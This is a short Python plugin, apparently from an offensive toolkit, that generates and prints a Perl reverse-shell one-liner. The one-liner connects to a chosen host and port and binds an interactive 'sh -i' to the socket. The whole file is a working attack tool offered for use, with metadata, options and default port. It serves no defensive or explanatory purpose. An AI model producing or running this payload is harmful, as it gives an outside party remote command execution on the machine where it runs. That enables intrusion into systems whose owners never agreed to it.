#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Perl-based reverse shell tool
metadata = {
    "name": "SignalShell Perl Reverse Shell",
    "description": "A Perl-based reverse shell that enables command execution from a remote location.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for the shell",
            "required": False,
            "default": "http",
        },
    },
}


class Encoder:
    pass


def generate_perl_reverse_shell(host, port):
    """Generates a Perl reverse shell command"""
    return f"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");}};'"""


def run(args):
    """Execute the Perl reverse shell based on provided arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    perl_script = generate_perl_reverse_shell(lhost, lport)
    print(perl_script)
